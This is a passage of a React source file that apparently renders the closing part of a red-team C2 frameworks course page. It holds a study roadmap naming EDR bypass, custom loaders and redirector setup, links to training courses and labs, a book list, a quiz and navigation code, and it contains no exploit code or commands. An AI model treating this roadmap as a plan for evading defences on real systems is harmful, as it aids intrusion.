                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Deploy redirectors using Apache/Nginx" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Configure SSL certificates and domain categorization" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Practice traffic blending and profile customization" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                  </List>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>4. Advanced Operations (Months 4+)</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                    Master evasion, custom tooling, and adversary simulation.
                  </Typography>
                  <List dense>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Study EDR internals and bypass techniques" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Learn to write BOFs and custom loaders" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                    <ListItem sx={{ py: 0 }}><ListItemText primary="• Practice OPSEC-focused operations in labs" primaryTypographyProps={{ variant: "body2" }} /></ListItem>
                  </List>
                </StepContent>
              </Step>
            </Stepper>
          </Paper>

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Learning Resources
            </Typography>
            <Grid container spacing={2}>
              {[
                { name: "Red Team Ops Course", desc: "Zero-Point Security RTO - Highly recommended", url: "https://training.zeropointsecurity.co.uk", category: "Course" },
                { name: "Sliver Documentation", desc: "Official Sliver wiki and tutorials", url: "https://sliver.sh", category: "Docs" },
                { name: "Cobalt Strike Training", desc: "Official CS training and certification", url: "https://www.cobaltstrike.com/training", category: "Course" },
                { name: "The C2 Matrix", desc: "Compare all C2 frameworks features", url: "https://www.thec2matrix.com", category: "Reference" },
                { name: "SANS SEC565", desc: "Red Team Ops & Adversary Emulation", url: "https://www.sans.org/sec565", category: "Course" },
                { name: "SpecterOps Blog", desc: "Advanced red team research and techniques", url: "https://posts.specterops.io", category: "Blog" },
                { name: "Mythic Documentation", desc: "Official Mythic wiki and agent docs", url: "https://docs.mythic-c2.net", category: "Docs" },
                { name: "Red Team Village", desc: "Community talks and resources", url: "https://redteamvillage.io", category: "Community" },
                { name: "MITRE ATT&CK", desc: "Framework for adversary tactics and techniques", url: "https://attack.mitre.org", category: "Reference" },
              ].map((res, idx) => (
                <Grid item xs={12} md={4} key={idx}>
                  <Card sx={{ p: 2, height: "100%" }}>
                    <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 1 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{res.name}</Typography>
                      <Chip label={res.category} size="small" variant="outlined" />
                    </Box>
                    <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>{res.desc}</Typography>
                    <Typography
                      component="a"
                      href={res.url}
                      target="_blank"
                      rel="noopener"
                      sx={{ color: "primary.main", fontSize: "0.85rem" }}
                    >
                      Visit →
                    </Typography>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Practice Labs & Environments
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Hands-on practice is essential. These labs provide safe, legal environments to practice C2 operations.
            </Typography>
            <Grid container spacing={2}>
              {[
                { name: "HackTheBox Pro Labs", desc: "Offshore, RastaLabs, Cybernetics - realistic corporate networks", difficulty: "Advanced" },
                { name: "TryHackMe Red Team Path", desc: "Guided learning with structured rooms and paths", difficulty: "Beginner-Intermediate" },
                { name: "PentesterLab", desc: "Web and network exploitation with progression", difficulty: "Intermediate" },
                { name: "YOURPWN Labs", desc: "Active Directory attack paths and techniques", difficulty: "Advanced" },
                { name: "Home Lab (DIY)", desc: "Build your own AD environment with VMs", difficulty: "Beginner" },
                { name: "DVWA/DVCP", desc: "Damn Vulnerable apps for basic practice", difficulty: "Beginner" },
              ].map((lab, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 2, p: 2, bgcolor: alpha(theme.palette.primary.main, 0.03), borderRadius: 1 }}>
                    <SpeedIcon sx={{ color: "primary.main" }} />
                    <Box sx={{ flex: 1 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{lab.name}</Typography>
                      <Typography variant="caption" color="text.secondary">{lab.desc}</Typography>
                    </Box>
                    <Chip 
                      label={lab.difficulty} 
                      size="small" 
                      color={lab.difficulty === "Beginner" ? "success" : lab.difficulty === "Intermediate" ? "warning" : "error"}
                      variant="outlined"
                    />
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* Books and Reading */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Recommended Reading
            </Typography>
            <Grid container spacing={2}>
              {[
                { title: "Red Team Development and Operations", author: "Joe Vest & James Tubberville", topic: "Red team methodology" },
                { title: "The Hacker Playbook 3", author: "Peter Kim", topic: "Practical red teaming" },
                { title: "Attacking Network Protocols", author: "James Forshaw", topic: "Protocol analysis" },
                { title: "Evading EDR", author: "Matt Hand", topic: "Modern evasion techniques" },
              ].map((book, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Box sx={{ display: "flex", gap: 2 }}>
                    <Box sx={{ width: 4, bgcolor: "primary.main", borderRadius: 1 }} />
                    <Box>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{book.title}</Typography>
                      <Typography variant="caption" color="text.secondary">by {book.author}</Typography>
                      <Typography variant="body2" sx={{ mt: 0.5 }}>{book.topic}</Typography>
                    </Box>
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>
        </Box>

      <Paper
        id="quiz-section"
        sx={{
          mt: 4,
          p: 4,
          borderRadius: 3,
          border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`,
          scrollMarginTop: 80,
        }}
      >
        <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
          <QuizIcon sx={{ color: QUIZ_ACCENT_COLOR }} />
          Knowledge Check
        </Typography>
        <QuizSection
          questions={quizQuestions}
          accentColor={QUIZ_ACCENT_COLOR}
          title="C2 Frameworks Knowledge Check"
          description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
          questionsPerQuiz={QUIZ_QUESTION_COUNT}
        />
      </Paper>

      {/* Bottom Navigation */}
      <Box sx={{ mt: 4, textAlign: "center" }}>
        <Button
          variant="outlined"
          startIcon={<ArrowBackIcon />}
          onClick={() => navigate("/learn")}
          sx={{ borderColor: accent, color: accent }}
        >
          Back to Learning Hub
        </Button>
      </Box>
        </Container>
      </Box>

      {/* Floating Action Buttons */}
      <Fab
        color="primary"
        onClick={() => setNavDrawerOpen(true)}
        sx={{
          position: "fixed",
          bottom: 90,
          right: 24,
          zIndex: 1000,
          bgcolor: accent,
          "&:hover": { bgcolor: "#b91c1c" },
          boxShadow: `0 4px 20px ${alpha(accent, 0.4)}`,
          display: { xs: "flex", lg: "none" },
        }}
      >
        <ListAltIcon />
      </Fab>

      {/* Scroll to Top FAB */}
      <Fab
        size="small"
        onClick={scrollToTop}
        sx={{
          position: "fixed",
          bottom: 32,
          right: 28,
          zIndex: 1000,
          bgcolor: alpha(accent, 0.15),
          color: accent,
          "&:hover": { bgcolor: alpha(accent, 0.25) },
          display: { xs: "flex", lg: "none" },
        }}
      >
        <KeyboardArrowUpIcon />
      </Fab>

      {/* Navigation Drawer for Mobile */}
      <Drawer
        anchor="right"
        open={navDrawerOpen}
        onClose={() => setNavDrawerOpen(false)}
        PaperProps={{
          sx: {
            width: isMobile ? "85%" : 320,
            bgcolor: theme.palette.background.paper,
            backgroundImage: "none",
          },
        }}
      >
        <Box sx={{ p: 2 }}>
          <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, display: "flex", alignItems: "center", gap: 1 }}>
              <ListAltIcon sx={{ color: accent }} />
              Course Navigation
            </Typography>
            <IconButton onClick={() => setNavDrawerOpen(false)} size="small">
              <CloseIcon />
            </IconButton>
          </Box>

          <Divider sx={{ mb: 2 }} />

          {/* Progress indicator */}
          <Box sx={{ mb: 2, p: 1.5, borderRadius: 2, bgcolor: alpha(accent, 0.05) }}>
            <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
              <Typography variant="caption" color="text.secondary">
                Progress
              </Typography>
              <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>
                {Math.round(progressPercent)}%
              </Typography>
            </Box>
            <LinearProgress
              variant="determinate"
              value={progressPercent}
              sx={{
                height: 6,
                borderRadius: 3,
                bgcolor: alpha(accent, 0.1),
                "& .MuiLinearProgress-bar": {
                  bgcolor: accent,
                  borderRadius: 3,
                },
              }}
            />
          </Box>

          {/* Navigation List */}
          <List dense sx={{ mx: -1 }}>
            {sectionNavItems.map((item) => (
              <ListItem
                key={item.id}
                onClick={() => scrollToSection(item.id)}
                sx={{
                  borderRadius: 2,
                  mb: 0.5,
                  pl: item.indent ? 4 : 2,
                  cursor: "pointer",
                  bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                  borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                  "&:hover": {
                    bgcolor: alpha(accent, 0.08),
                  },
                  transition: "all 0.15s ease",
                }}
              >
                <ListItemIcon sx={{ minWidth: item.indent ? 24 : 32, color: activeSection === item.id ? accent : "text.secondary" }}>
                  {item.icon}
                </ListItemIcon>
                <ListItemText
                  primary={
                    <Typography
                      variant={item.indent ? "caption" : "body2"}
                      sx={{
                        fontWeight: activeSection === item.id ? 700 : 500,
                        color: activeSection === item.id ? accent : "text.primary",
                      }}
                    >
                      {item.label}
                    </Typography>
                  }
                />
              </ListItem>
            ))}
          </List>
        </Box>
      </Drawer>
    </LearnPageLayout>
  );
}
